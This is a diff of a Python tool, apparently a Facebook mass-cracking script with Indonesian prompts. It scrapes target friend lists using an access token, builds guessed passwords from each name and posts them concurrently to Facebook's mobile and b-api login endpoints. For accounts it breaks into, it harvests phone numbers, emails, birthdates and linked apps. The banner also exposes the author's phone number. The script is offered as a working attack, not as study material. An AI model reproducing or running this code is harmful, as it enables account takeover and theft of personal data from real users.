@@ -58,7 +58,7 @@ def banner():
 	wel = '# WELCOME TO FACEBOOK  TOOLS 2022'
 	wel2 = mark(wel, style='cyan')
 	sol().print(wel2)
-	au='AUTHOR    :  Alzwage\nGITHUB    :  https://github.com/AhmedAlzwage\nWHATSAPP  :  ولد القحبه ااي ينشرها
+	au='AUTHOR    :  Alzwage\nGITHUB    :  https://github.com/AhmedAlzwage\nWHATSAPP  :  00218921762445'
 	pengembang1=nel(au,style="cyan")
 	cetak(nel(pengembang1, title='INFORMASI PENGEMBANG'))
 
@@ -346,7 +346,7 @@ def dump_publik():
 	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
 	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
 	try:
-		koh2 = requests.get('
+		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
@@ -390,7 +390,7 @@ def dump_massal():
 		uid.append(kl)
 	for userr in uid:
 		try:
-			col = ses.get('
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -475,7 +475,50 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'api' in method:
+				pool.submit(crack2,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crack3,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
+	print('')
+	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
+	sol().print(mark(tanya, style='green'))
+	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
+	if woi in ['y','Y']:
+		cek_opsi()
+	else:
+		exit()
+
+# CRACKER
+def crack(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	print('\r%s<-> %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			tix = time.time()
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
@@ -511,10 +554,13 @@ def passwrd():
 					session = requests.Session()
 					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
 					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
 					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
 					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
 					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
 					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
+					try:apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
+					except:apkAktif = ""
 					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
 					except:nomer = ""
 					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
@@ -532,8 +578,7 @@ def passwrd():
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
-
+					infoakun += (f"[✓] Nama Akun       : {nama}          [✓]Aplikasi Aktif         : {apkAktif} \n")
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
 					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
@@ -552,7 +597,7 @@ def passwrd():
 						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
 							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
 						else:
-							hit1,hit2=0,0
+							hit1,hit2=1,1
 							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
 							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
 							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
@@ -585,7 +630,8 @@ def crack2(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-	        p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
+			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
 			if "www.facebook.com" in resp.json()["error_msg"]:
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
@@ -683,16 +729,6 @@ def crack3(idf,pwv):
 					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
 					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
 					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
-					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
-					except:nomer = ""
-					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
-					except:email=""
-					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
-					except:ttl=""
-					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-					except:teman = ""
-					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
-					except:pengikut = ""
 					try:
 						tahun = ""
 						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
@@ -700,7 +736,7 @@ def crack3(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
+					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman       : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
@@ -836,10 +872,3 @@ if __name__=='__main__':
 	try:os.mkdir('OK')
 	except:pass
 	login()
-	
-	
-	def update():
-    os.system('clear')
-    os.system('pkg update && pkg upgrade')
-    os.system('git pull')
-    os.system('python 4MBF.py')
